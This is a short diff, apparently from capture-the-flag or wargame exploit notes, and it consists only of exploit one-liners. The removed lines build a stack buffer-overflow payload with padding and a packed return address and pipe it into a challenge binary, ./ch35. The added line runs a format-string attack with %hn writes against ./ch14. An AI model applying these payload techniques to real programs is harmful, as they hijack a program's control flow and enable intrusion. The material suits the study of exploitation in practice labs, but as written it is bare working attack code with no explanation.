@@ -1,2 +1,1 @@
-python -c 'import struct;print "A"*272+"DDDDDDDD"+struct.pack("<Q", 0x00000000004005e7)' > /tmp/payloads
-(cat /tmp/payloads; cat) | ./ch35
+./ch14 $(python -c 'print "\xe8\xf9\xff\xbf\xea\xf9\xff\xbf%48871x%9$hn%8126x%10$hn"')
